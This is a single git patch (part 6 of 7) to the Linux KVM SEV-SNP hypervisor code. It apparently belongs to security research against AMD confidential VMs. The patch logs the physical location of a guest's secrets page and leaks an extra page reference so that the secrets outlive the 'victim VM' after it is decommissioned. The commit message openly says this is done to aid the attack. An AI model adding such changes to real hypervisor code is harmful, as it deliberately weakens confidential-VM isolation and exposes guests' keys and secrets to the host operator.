From bffbae13eb5ffc3bcea65f1ac5b6400decd97343 Mon Sep 17 00:00:00 2001
From: Tom Dohrmann <erbse.13@gmx.de>
Date: Fri, 8 Dec 2023 13:30:22 +0000
Subject: [PATCH 6/7] log & leak locations of secret pages

We leak the page, so that it's not reused after the victim VM is
decommissioned. We also log it to make it easier to locate when
performing the attack.
---
 arch/x86/kvm/svm/sev.c | 7 +++++++
 1 file changed, 7 insertions(+)

diff --git a/arch/x86/kvm/svm/sev.c b/arch/x86/kvm/svm/sev.c
index dfd98c3dac72..a0950eedb7bf 100644
--- a/arch/x86/kvm/svm/sev.c
+++ b/arch/x86/kvm/svm/sev.c
@@ -2132,6 +2132,13 @@ static int snp_launch_update_gfn_handler(struct kvm *kvm,
 			goto e_release;
 		}
 
+		if (params.page_type == KVM_SEV_SNP_PAGE_TYPE_SECRETS) {
+			pr_info("Detected secret page at pfn %llx\n", pfns[i]);
+			// Increase the refcount to increase the likelyhood of the secrets
+			// still being there after the VM shuts down.
+			get_page(pfn_to_page(pfns[i]));
+		}
+
 		data.address = __sme_set(pfns[i] << PAGE_SHIFT);
 		data.page_size = X86_TO_RMP_PG_LEVEL(PG_LEVEL_4K);
 		data.page_type = params.page_type;
-- 
2.34.1

